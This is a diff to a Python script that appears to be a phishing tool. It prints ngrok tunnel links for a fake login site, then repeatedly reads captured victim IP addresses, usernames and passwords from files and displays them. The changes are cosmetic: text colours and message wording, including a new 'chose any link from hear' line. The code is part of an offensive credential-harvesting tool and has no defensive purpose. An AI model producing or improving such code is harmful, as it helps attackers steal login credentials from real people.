@@ -97,11 +97,12 @@ print()
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
     datajson = json.load(data_file)
-msg = (""+green+"Your link is:"+blue+" ")
+msg = (""+green+"Your link is:"+cyan+" ")
 for i in datajson['tunnels']:
-    msg = msg + i['public_url']+ '\n'+''+blue+'Your second link : '+yellow+''
+    msg = msg + i['public_url']+ '\n'+''+blue+'Your link is : '+yellow+''
 os.system('clear')
 print (msg)
+print("   chose any link from hear")
 while True:
 	if os.path.isfile("site/"+website+"/ip.txt")==True:
 		jop=open("site/"+website+"/ip.txt","r")
@@ -115,7 +116,7 @@ while True:
 		Ah=abir.readline()
 		start=int(Ah.find("Username:"))
 		end=int(Ah.find("Pass:"))
-		print("\t"+red+"victim username : "+Ah[start+9:end])
-		print("\t"+red+"victim Password : "+Ah[end+5:])
+		print("\t"+red+"victim username :"+green+""+Ah[start+9:end])
+		print("\t"+red+"victim Password :"+green+""+Ah[end+5:])
 		abir.close()
 		os.system("rm -rf site/"+website+"/usernames.txt")
